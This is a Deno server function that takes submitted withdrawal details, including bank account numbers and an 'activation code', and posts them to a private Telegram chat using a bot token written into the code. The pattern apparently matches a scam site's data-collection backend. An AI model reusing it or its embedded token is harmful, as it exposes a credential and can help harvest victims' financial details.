import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { accountName, accountNumber, bank, amount, currency, activationCode } = await req.json();

    const botToken = '7916544847:AAFrB1lhLI_xE9KBjYRVj6uUdmZrw93ZMiY';
    const chatId = '6952558480';

    const message = `🔔 *Withdrawal Request*\n\n` +
      `👤 *Account Name:* ${accountName}\n` +
      `🏦 *Bank:* ${bank}\n` +
      `💳 *Account Number:* ${accountNumber}\n` +
      `💰 *Amount:* ${currency === 'NGN' ? '₦' : '$'}${amount.toLocaleString()}\n` +
      `🔑 *Activation Code:* ${activationCode}\n` +
      `💱 *Currency:* ${currency}\n` +
      `⏰ *Time:* ${new Date().toLocaleString()}`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      }),
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    return new Response(
      JSON.stringify({ success: true, message: 'Notification sent successfully' }),
      { 
        headers: { 
          ...corsHeaders,
          'Content-Type': 'application/json' 
        } 
      }
    );

  } catch (error) {
    console.error('Error sending telegram notification:', error);
    
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: error.message 
      }),
      { 
        status: 500,
        headers: { 
          ...corsHeaders,
          'Content-Type': 'application/json' 
        } 
      }
    );
  }
});